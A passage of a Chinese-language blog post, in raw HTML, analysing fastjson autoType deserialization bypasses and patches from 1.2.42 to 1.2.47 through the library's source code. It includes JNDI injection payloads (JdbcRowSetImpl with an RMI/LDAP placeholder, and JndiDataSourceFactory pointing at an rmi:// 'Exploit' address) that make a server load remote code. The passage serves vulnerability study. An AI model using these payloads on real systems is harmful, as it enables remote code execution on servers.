class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//hash计算基础参数</span></span><br><span class="line"><span class="keyword">long</span> BASIC = -<span class="number">3750763034362895579L</span>;</span><br><span class="line"><span class="keyword">long</span> PRIME = <span class="number">1099511628211L</span>;</span><br><span class="line"><span class="comment">//L开头，；结尾</span></span><br><span class="line"><span class="keyword">if</span> (((-<span class="number">3750763034362895579L</span> ^ (<span class="keyword">long</span>)className.charAt(<span class="number">0</span>)) * <span class="number">1099511628211L</span> ^ (<span class="keyword">long</span>)className.charAt(className.length() - <span class="number">1</span>)) * <span class="number">1099511628211L</span> == <span class="number">655701488918567152L</span>) &#123;</span><br><span class="line">    <span class="comment">//LL开头</span></span><br><span class="line">    <span class="keyword">if</span> (((-<span class="number">3750763034362895579L</span> ^ (<span class="keyword">long</span>)className.charAt(<span class="number">0</span>)) * <span class="number">1099511628211L</span> ^ (<span class="keyword">long</span>)className.charAt(<span class="number">1</span>)) * <span class="number">1099511628211L</span> == <span class="number">655656408941810501L</span>) &#123;</span><br><span class="line">        <span class="comment">//直接爆出异常</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"autoType is not support. "</span> + typeName);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    className = className.substring(<span class="number">1</span>, className.length() - <span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可见就对了LL开头的绕过进行了封堵。</p><p>至此我们之前的两个利用链JdbcRowSetImpl和TemplatesImpl正式被封堵了（暂时）。在服务端放开白名单限制的情况下也绕不过黑名单。更别说服务端默认是开启白名单的，这时候fastjson的风险已经很小了。</p><p>之后就是不断有新的组件作为利用链引入进行攻击，和黑名单的不断扩充之间的拉锯战。（之前也说过着一切都是在显性关闭白名单的情况下）</p><h3 id="1-2-44-限制"><a href="#1-2-44-限制" class="headerlink" title="1.2.44 [ 限制"></a>1.2.44 [ 限制</h3><p>1.2.44补充了loadclass时<code>[</code>的利用情况，上面说到过，实际上这种形式的payload是用不了的。</p><p>比如FastjsonExpliot框架中的<code>{&quot;@type&quot;:&quot;[com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;###RMI_LDAP_ADDRESS###&quot;,&quot;autoCommit&quot;:true}</code></p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gae20r1rm1j31jx12n79e.jpg" alt="1.2.42-左括号-失败.png"></p><p>但是在1.2.44中仍然对于这类类名进行了限制，使用同样的payload进行测试。</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gae20kc2g7j31qu1010yj.jpg" alt="1.2.44-左括号-失败.png"></p><h3 id="1-2-45-黑名单添加"><a href="#1-2-45-黑名单添加" class="headerlink" title="1.2.45 黑名单添加"></a>1.2.45 黑名单添加</h3><p>1.2.45添加了黑名单，封堵了一些可以绕过黑名单的payload，比如:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//需要有第三方组件ibatis-core 3:0</span><br><span class="line">&#123;&quot;@type&quot;:&quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory&quot;,&quot;properties&quot;:&#123;&quot;data_source&quot;:&quot;rmi://localhost:1099/Exploit&quot;&#125;&#125;</span><br></pre></td></tr></table></figure><p>黑名单封堵呢，其实是一个动态的过程，会有很多新增的jar包，如果服务端引入了这些额外的jar包，就会引入一条可利用链，，或者jdk又被发掘出了新增的链等等都会导致黑名单可被绕过。当然在1.2.25之后这都是要在显性白名单的情况下，才有的问题。</p><p>之后更新的版本比如1.2.46也都在补充黑名单</p><p>但是在1.2.47时，一个全新的payload就没有这种限制，通杀。</p><h3 id="1-2-47-通杀payload！"><a href="#1-2-47-通杀payload！" class="headerlink" title="1.2.47 通杀payload！"></a>1.2.47 通杀payload！</h3><p>我们在分析1.2.47时，将从一个挖掘0day的角度去一步步分析，企图复现这个漏洞的挖掘过程，不然正向看，不得劲。payload在最后给出。</p><p>我们重新来理一下<code>com.alibaba.fastjson.parser.ParserConfig#checkAutoType(java.lang.String, java.lang.Class&lt;?&gt;, int)</code>这个阻挠我们的方法，上面我们提到过白名单开关时我们走的是不一样的路线，还在注释中提到会有一些固定类型的判断，这就是通杀payload的关键。</p><p>我们接下来看的是1.2.47版本的包，我们看总结后的代码结构：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass, <span class="keyword">int</span> features) &#123;</span><br><span class="line">        <span class="comment">//1.typeName为null的情况，略</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//2.typeName太长或太短的情况，略</span></span><br><span class="line">        </span><br><span class="line"><span class="comment">//3.替换typeName中$为.，略</span></span><br><span class="line">        </span><br><span class="line"><span class="comment">//4.使用hash的方式去判断[开头，或L开头;结尾，直接报错</span></span><br><span class="line">    <span class="comment">//这里经过几版的修改，有点不一样了，但是绕不过，也略</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//5.autoTypeSupport为true(白名单关闭)的情况下，返回符合白名单的，报错符合黑名单的</span></span><br><span class="line">        <span class="comment">//(这里可以发现，白名单关闭的配置情况下，必须先过黑名单，但是留下了一线生机)</span></span><br><span class="line">    <span class="keyword">if</span> (autoTypeSupport || expectClass != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">long</span> hash = h3;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">3</span>; i &lt; className.length(); ++i) &#123;</span><br><span class="line">                hash ^= className.charAt(i);</span><br><span class="line">                hash *= PRIME;</span><br><span class="line">                <span class="keyword">if</span> (Arrays.binarySearch(acceptHashCodes, hash) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                    clazz = TypeUtils.loadClass(typeName, defaultClassLoader, <span class="keyword">false</span>);</span><br><span class="line">                    <span class="keyword">if</span> (clazz != <span class="keyword">null</span>) &#123;</span><br><span class="line">                        <span class="keyword">return</span> clazz;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">//要求满足黑名单并且从一个Mapping中找不到这个类才会报错，这个Mapping就是我们的关键</span></span><br><span class="line">                <span class="keyword">if</span> (Arrays.binarySearch(denyHashCodes, hash) &gt;= <span class="number">0</span> &amp;&amp; TypeUtils.getClassFromMapping(typeName) == <span class="keyword">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"autoType is not support. "</span> + typeName);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//6.从一个Mapping中获取这个类名的类，我们之后看</span></span><br><span class="line">        <span class="keyword">if</span> (clazz == <span class="keyword">null</span>) &#123;</span><br><span class="line">            clazz = TypeUtils.getClassFromMapping(typeName);</span><br><span class="line">        &#125;</span><br><span class="line"><span class="comment">//7.从反序列化器中获取这个类名的类，我们也之后看</span></span><br><span class="line">        <span class="keyword">if</span> (clazz == <span class="keyword">null</span>) &#123;</span><br><span class="line">            clazz = deserializers.findClass(typeName);</span><br><span class="line">        &#125;</span><br><span class="line"><span class="comment">//8.如果在6，7中找到了clazz，这里直接return出去，不继续了</span></span><br><span class="line">        <span class="keyword">if</span> (clazz != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (expectClass != <span class="keyword">null</span></span><br><span class="line">                    &amp;&amp; clazz != java.util.HashMap.class</span><br><span class="line">                    &amp;&amp; !expectClass.isAssignableFrom(clazz)) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"type not match. "</span> + typeName + <span class="string">" -&gt; "</span> + expectClass.getName());</span><br><span class="line">            &#125;</span><br><span class="line">   <span class="comment">//无论是默认白名单开启还是手动白名单关闭的情况，我们都要从这个return clazz中出去</span></span><br><span class="line">            <span class="keyword">return</span> clazz;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="comment">// 9. 针对默认白名单开启情况的处理，这里</span></span><br><span class="line">        <span class="keyword">if</span> (!autoTypeSupport) &#123;</span><br><span class="line">            <span class="keyword">long</span> hash = h3;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">3</span>; i &lt; className.length(); ++i) &#123;</span><br><span class="line">                <span class="keyword">char</span> c = className.charAt(i);</span><br><span class="line">                hash ^= c;</span><br><span class="line">                hash *= PRIME;</span><br><span class="line"><span class="comment">//碰到黑名单就死</span></span><br><span class="line">                <span class="keyword">if</span> (Arrays.binarySearch(denyHashCodes, hash) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"autoType is not support. "</span> + typeName);</span><br><span class="line">                &#125;</span><br><span class="line"><span class="comment">//满足白名单可以活，但是白名单默认是空的</span></span><br><span class="line">                <span class="keyword">if</span> (Arrays.binarySearch(acceptHashCodes, hash) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (clazz == <span class="keyword">null</span>) &#123;</span><br><span class="line">                        clazz = TypeUtils.loadClass(typeName, defaultClassLoader, <span class="keyword">false</span>);</span><br><span class="line">                    &#125;</span><br><span class="line"><span class="comment">//针对expectCLass的特殊处理，没有expectCLass，不管</span></span><br><span class="line">                    <span class="keyword">if</span> (expectClass != <span class="keyword">null</span> &amp;&amp; expectClass.isAssignableFrom(clazz)) &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"type not match. "</span> + typeName + <span class="string">" -&gt; "</span> + expectClass.getName());</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">return</span> clazz;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="comment">//通过以上全部检查，就可以从这里读取clazz</span></span><br><span class="line">        <span class="keyword">if</span> (clazz == <span class="keyword">null</span>) &#123;</span><br><span class="line">            clazz = TypeUtils.loadClass(typeName, defaultClassLoader, <span class="keyword">false</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//这里对一些特殊的class进行处理，不重要</span></span><br><span class="line"></span><br><span class="line">       <span class="comment">//特性判断等</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> clazz;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>仔细分析了一下，可以发现无论是白名单开启与否，我们的恶意类都要想办法必须要从第8步的<code>return clazz</code>出去才有机会。</p><ol><li>因为白名单关闭（手动）时，我们如果进入第九步，会百分百跟黑名单正面撞上，必然被杀。我们只能在这之前溜出去，机会就在6，7步中。</li><li>白名单开启时（默认），虽然在第五步时，我们也会跟黑名单撞上，但是却莫名其妙的会有一线生机，只要满足<code>TypeUtils.getClassFromMapping(typeName) != null</code>（是!=）反而可以从黑名单中逃开。然后从第八步中return出去。</li></ol><p>那往之前看clazz可以从哪里赋值，5、6、7三个地方，但是5是白名单匹配才返回。这不可能。</p><p>于是开始关注6，7这两个操作到底是干啥的，（其实根据已知白名单开不开都通杀的特性，肯定是在第6步<code>TypeUtils.getClassFromMapping</code>中得到的恶意类，但是这边都瞅瞅，后面也会用到）</p><ol><li>TypeUtils.getClassFromMapping(typeName)</li><li>deserializers.findClass(typeName)</li></ol><h4 id="deserializers-findClass-typeName"><a href="#deserializers-findClass-typeName" class="headerlink" title="deserializers.findClass(typeName)"></a>deserializers.findClass(typeName)</h4><p>先看desesrializers，一个hashmap</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> IdentityHashMap&lt;Type, ObjectDeserializer&gt; deserializers         = <span class="keyword">new</span> IdentityHashMap&lt;Type, ObjectDeserializer&gt;();</span><br></pre></td></tr></table></figure><p>因为我们是从中取值，关注一下它是在哪里赋值的，当前文件搜索<code>deserializers.put</code>。</p><p><code>com.alibaba.fastjson.parser.ParserConfig#initDeserializers</code>：给出一部分截图</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gae208j8n5j315c0ks0vj.jpg" alt="initDeserializers.png"></p><p>initDeserializers这个函数是在parserConfig类的构造函数中初始化时调用的，存放的是一些认为没有危害的固定常用类。理所当然不会包含我们的利用类。</p><p>除此之外还有两个类会影响到desesrializers这个map</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">com.alibaba.fastjson.parser.ParserConfig#getDeserializer(java.lang.Class&lt;?&gt;, java.lang.reflect.Type)</span><br><span class="line">    <span class="comment">//太过复杂代码省略</span></span><br></pre></td></tr></table></figure><p>在这个类中会往deserializers这个mapping中放入一些特定类：<code>java.awt.*</code>、<code>java.time.*</code>、<code>java.util.Optional*</code>、<code>java.nio.file.Path</code>、<code>Map.Entry.class</code>、以及在服务器<code>META-INF/services/</code>目录下存放的class文件，还有枚举类的一些判断。对于一些数组，集合，map等再调用<code>putDesserializer</code>（这也是另一个会影响到desesrializers这个map的类）放入deserializers这个mapping中。</p><p>在这个类中对于类名有着严格的要求和限定，不太行。看下一个。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">com.alibaba.fastjson.parser.ParserConfig#putDeserializer</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">putDeserializer</span><span class="params">(Type type, ObjectDeserializer deserializer)</span> </span>&#123;</span><br><span class="line">        deserializers.put(type, deserializer);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>代码极其简单，但是只在ParserConfig#getDeserializer（就是上面那个类）和<code>initJavaBeanDeserializers</code>类中使用过。但是后者是一个初始化函数，我们同样不可控输入值。</p><p>那么我们好像发现我们的输入不可以改变deserializers这个mapping的值，从而自然也不能进一步在checkAutoType中被get读取出来，也就绕过不了。</p><p>这个<strong>deserializers在checkAutoType方法中存在的意义</strong>应该是直接放行一些常用的类，来提升解析速度。</p><p>那我们换一条路看看<code>TypeUtils.getClassFromMapping(typeName)</code>。</p><h4 id="TypeUtils-getClassFromMapping-typeName"><a href="#TypeUtils-getClassFromMapping-typeName" class="headerlink" title="TypeUtils.getClassFromMapping(typeName)"></a>TypeUtils.getClassFromMapping(typeName)</h4><p>先看<code>getClassFromMapping</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//这个map是一个hashmap</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> ConcurrentMap&lt;String,Class&lt;?&gt;&gt; mappings = <span class="keyword">new</span> ConcurrentHashMap&lt;String,Class&lt;?&gt;&gt;(<span class="number">16</span>, <span class="number">0.75f</span>, <span class="number">1</span>);</span><br><span class="line"> ...</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Class&lt;?&gt; getClassFromMapping(String className)&#123;</span><br><span class="line">        <span class="comment">//很简单的一个mapping的get</span></span><br><span class="line">        <span class="keyword">return</span> mappings.get(className);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>按照套路去寻找影响这个mappings的put方法。搜索<code>mappings.put</code>，在下面这两个方法中有找到：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">com.alibaba.fastjson.util.TypeUtils#addBaseClassMappings</span><br><span class="line">com.alibaba.fastjson.util.TypeUtils#loadClass(java.lang.String, java.lang.ClassLoader, boolean)</span><br></pre></td></tr></table></figure><p>看<code>addBaseClassMappings</code>这个方法，方法内容很长，我们就不细看了，但是它是一个没有传参的方法….这样我们就没有一个可控的参数去控制其中的内容。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">addBaseClassMappings</span><span class="params">()</span></span>&#123;</span><br><span class="line">    mappings.put(<span class="string">"byte"</span>, <span class="keyword">byte</span>.class);</span><br><span class="line">    mappings.put(<span class="string">"short"</span>, <span class="keyword">short</span>.class);</span><br><span class="line">    mappings.put(<span class="string">"int"</span>, <span class="keyword">int</span>.class);</span><br><span class="line">    mappings.put(<span class="string">"long"</span>, <span class="keyword">long</span>.class);</span><br><span class="line">    <span class="comment">//诸如此类的放入一些固定的class至mappings中</span></span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>并且还只在两个没毛病的地方调用了这个方法：</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gae200kj2oj31es06o0tv.jpg" alt="addBaseClassMappings.png"></p><p>前者是一个static静态代码块：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span>&#123;</span><br><span class="line">        addBaseClassMappings();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>后者是一个<code>clearClassMapping</code>方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">public static void clearClassMapping()&#123;</span><br><span class="line">    mappings.clear();</span><br><span class="line">    addBaseClassMappings();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>没戏，不可控。</p><p>再看另一个有mappings.put的位置<code>TypeUtils.loadClass</code>，我们需要详细看看这个方法：</p><blockquote><p>其实这个TypeUtils.loadClass，在1.2.25-1.2.41中我们分析过一小段，其实是同一个函数！</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Class&lt;?&gt; loadClass(String className, ClassLoader classLoader, <span class="keyword">boolean</span> cache) &#123;</span><br><span class="line">       <span class="comment">//判断className是否为空，是的话直接返回null</span></span><br><span class="line">    <span class="keyword">if</span>(className == <span class="keyword">null</span> || className.length() == <span class="number">0</span>)&#123;</span><br><span class="line">           <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">       &#125;</span><br><span class="line">    <span class="comment">//判断className是否已经存在于mappings中</span></span><br><span class="line">       Class&lt;?&gt; clazz = mappings.get(className);</span><br><span class="line">       <span class="keyword">if</span>(clazz != <span class="keyword">null</span>)&#123;</span><br><span class="line">           <span class="comment">//是的话，直接返回</span></span><br><span class="line">           <span class="keyword">return</span> clazz;</span><br><span class="line">       &#125;</span><br><span class="line">    <span class="comment">//判断className是否是[开头，1.2.44中针对限制的东西就是这个</span></span><br><span class="line">       <span class="keyword">if</span>(className.charAt(<span class="number">0</span>) == <span class="string">'['</span>)&#123;</span><br><span class="line">           Class&lt;?&gt; componentType = loadClass(className.substring(<span class="number">1</span>), classLoader);</span><br><span class="line">           <span class="keyword">return</span> Array.newInstance(componentType, <span class="number">0</span>).getClass();</span><br><span class="line">       &#125;</span><br><span class="line">    <span class="comment">//判断className是否L开头;结尾，1.2.42，43中针对限制的就是这里，但都是在外面限制的，里面的东西没变</span></span><br><span class="line">       <span class="keyword">if</span>(className.startsWith(<span class="string">"L"</span>) &amp;&amp; className.endsWith(<span class="string">";"</span>))&#123;</span><br><span class="line">           String newClassName = className.substring(<span class="number">1</span>, className.length() - <span class="number">1</span>);</span><br><span class="line">           <span class="keyword">return</span> loadClass(newClassName, classLoader);</span><br><span class="line">       &#125;</span><br><span class="line">    <span class="comment">//1. 我们需要关注的mappings在这里有</span></span><br><span class="line">       <span class="keyword">try</span>&#123;</span><br><span class="line">           <span class="comment">//输入的classLoader不为空时</span></span><br><span class="line">           <span class="keyword">if</span>(classLoader != <span class="keyword">null</span>)&#123;</span><br><span class="line">               <span class="comment">//调用加载器去加载我们给的className</span></span><br><span class="line">               clazz = classLoader.loadClass(className);</span><br><span class="line">               <span class="comment">//！！如果cache为true！！</span></span><br><span class="line">               <span class="keyword">if</span> (cache) &#123;</span><br><span class="line">                   <span class="comment">//往我们关注的mappings中写入这个className</span></span><br><span class="line">                   mappings.put(className, clazz);</span><br><span class="line">               &#125;</span><br><span class="line">               <span class="keyword">return</span> clazz;<span class="comment">//返回加载出来的类</span></span><br><span class="line">           &#125;</span><br><span class="line">       &#125; <span class="keyword">catch</span>(Throwable e)&#123;</span><br><span class="line">           e.printStackTrace();</span><br><span class="line">           <span class="comment">// skip</span></span><br><span class="line">       &#125;</span><br><span class="line">    <span class="comment">//2. 在这里也有，但是好像这里有关线程，比较严格。</span></span><br><span class="line">       <span class="keyword">try</span>&#123;</span><br><span class="line">           ClassLoader contextClassLoader = Thread.currentThread().getContextClassLoader();</span><br><span class="line">           <span class="keyword">if</span>(contextClassLoader != <span class="keyword">null</span> &amp;&amp; contextClassLoader != classLoader)&#123;</span><br><span class="line">               clazz = contextClassLoader.loadClass(className);</span><br><span class="line">               <span class="comment">//同样需要输入的cache为true，才有可能修改</span></span><br><span class="line">               <span class="keyword">if</span> (cache) &#123;</span><br><span class="line">                   mappings.put(className, clazz);</span><br><span class="line">               &#125;</span><br><span class="line">               <span class="keyword">return</span> clazz;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125; <span class="keyword">catch</span>(Throwable e)&#123;</span><br><span class="line">           <span class="comment">// skip</span></span><br><span class="line">       &#125;</span><br><span class="line">    <span class="comment">//3. 这里也有，限制很松</span></span><br><span class="line">       <span class="keyword">try</span>&#123;</span><br><span class="line">           <span class="comment">//加载类</span></span><br><span class="line">           clazz = Class.forName(className);</span><br><span class="line">           <span class="comment">//直接放入mappings中</span></span><br><span class="line">           mappings.put(className, clazz);</span><br><span class="line">           <span class="keyword">return</span> clazz;</span><br><span class="line">       &#125; <span class="keyword">catch</span>(Throwable e)&#123;</span><br><span class="line">           <span class="comment">// skip</span></span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> clazz;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>可以发现如果可以控制输入参数，是可以往这个mappings中写入任意类名的（从而绕过autocheck的黑白名单）</p><p>看看这个类在什么地方被引用。</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gae1zt2oc7j31hl09egn5.jpg" alt="loadClass.png"></p><p>前三者都是在<code>ParserConfig#autocheck</code>这个我们需要攻克的类中，如果能在那里调用loadClass并传入一个恶意类去加载。那就已经完成了我们的最终目的，根本不需要通过mappings这个空子去钻。</p><p>所以只需要看TypeUtils.java中的引用处。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Class&lt;?&gt; loadClass(String className, ClassLoader classLoader) &#123;</span><br><span class="line">        <span class="keyword">return</span> loadClass(className, classLoader, <span class="keyword">true</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><strong>cache为true</strong>，一个好消息，因为有三处修改mapping的地方，两个地方需要cache为true。</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gae1zmg3hyj31ny09pq4l.jpg" alt="loadClass2.png"></p><p>这百年可以看到在这个类中会自己引用自己的类，跳来跳去，但是也有外部的类引用当前类。这是我们主要关注的。（因为一个底层的工具类，不可能被我们直接调用到）</p><p>慢慢看，把跳出去的接口理出来</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/com/alibaba/fastjson/serializer/MiscCodec.java#deserialze(DefaultJSONParser parser, Type clazz, Object fieldName):334</span><br></pre></td></tr></table></figure><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gae1ze46z5j31mu0clwgz.jpg" alt="loadclass3.png"></p><p>这两个静态的，没搞头，就不看了。</p><p>只有上面一个跳出去<code>MiscCodec.java#deserialze</code>的，我们再过去看看：</p><blockquote><p>以下代码段请一大段一大段倒着回退回来看</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">public</span> &lt;T&gt; <span class="function">T <span class="title">deserialze</span><span class="params">(DefaultJSONParser parser, Type clazz, Object fieldName)</span> </span>&#123;</span><br><span class="line">      JSONLexer lexer = parser.lexer;</span><br><span class="line"></span><br><span class="line">      <span class="comment">//4. 